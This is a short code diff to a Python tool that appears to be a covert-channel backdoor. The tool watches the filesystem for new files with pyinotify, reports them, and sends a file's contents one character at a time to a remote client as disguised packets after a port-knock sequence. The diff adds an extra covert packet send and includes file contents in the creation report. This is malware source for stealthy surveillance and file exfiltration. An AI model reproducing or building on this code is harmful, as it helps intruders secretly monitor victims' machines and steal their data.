@@ -22,7 +22,7 @@ class EventHandler(pyinotify.ProcessEvent):
 		global string
 		isFile = os.path.isfile(event.pathname)
 		if isFile:
-			string = "Created file: " + event.pathname
+			string = "Created file: " + event.pathname + " Contents: "
 		else:
 			string = "Created Directory: " + event.pathname
 		sendMessage(string)
@@ -68,6 +68,7 @@ def removeWatch(target):
 def sendFile(target):
 	recvFunctions.knockCode(client, protocol, True)
 
+	send(utils.covertPacket(client, protocol, '\n', recvFunctions.pswd), verbose=0)
 	with open(target, 'r') as f:
 		while True:
 			c = f.read(1)
